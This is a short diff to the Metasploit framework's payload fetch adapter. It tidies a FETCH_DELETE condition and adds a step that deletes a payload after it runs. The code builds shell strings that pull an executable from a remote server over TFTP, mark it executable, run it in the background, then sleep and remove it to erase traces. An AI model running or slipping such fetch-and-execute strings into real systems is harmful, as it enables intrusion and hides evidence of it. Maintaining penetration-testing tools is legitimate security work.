@@ -352,7 +352,7 @@ module Msf::Payload::Adapter::Fetch
       cmds << "; #{_remote_destination_nix}& "
 
       if datastore['FETCH_DELETE']
-        cmds << "sleep #{rand(3..7)};rm -rf #{_remote_destination_nix}; fi" if datastore['FETCH_DELETE']
+        cmds << "sleep #{rand(3..7)};rm -rf #{_remote_destination_nix}; fi"
       else
         cmds << "fi"
       end
@@ -470,6 +470,9 @@ module Msf::Payload::Adapter::Fetch
       else
         _check_tftp_file
         tftp_fetch_and_exec = "(echo binary ; echo get #{uri} ) | tftp #{srvhost}; chmod +x ./#{uri}; ./#{uri} &"
+        # Trailing `;` matters: the shell-search fail-safe branch below
+        # concatenates this string directly in front of a closing ` fi`.
+        tftp_fetch_and_exec << "sleep #{rand(3..7)};rm -rf ./#{uri};" if datastore['FETCH_DELETE']
         if datastore['FETCH_FILELESS'] != 'none' && linux?
           get_file_cmd = "(echo binary ; echo get #{uri} $f ) | tftp #{srvhost}"
           return _generate_fileless_shell(get_file_cmd, module_info['AdaptedArch']) if datastore['FETCH_FILELESS'] == 'shell'
